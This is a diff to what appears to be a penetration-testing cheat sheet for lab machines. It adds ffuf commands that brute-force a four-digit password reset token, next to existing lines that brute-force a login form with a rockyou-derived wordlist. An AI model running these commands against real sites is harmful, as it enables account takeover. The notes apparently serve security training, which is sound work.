@@ -1128,6 +1128,13 @@ $ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
 $ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
 ```
 
+- Password Reset Token Brute-Force
+
+```
+$ seq -w 0 9999 > tokens.txt
+$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
+```
+
 #19. - Sensitive Data Exposure
 -----------------------------------------
 
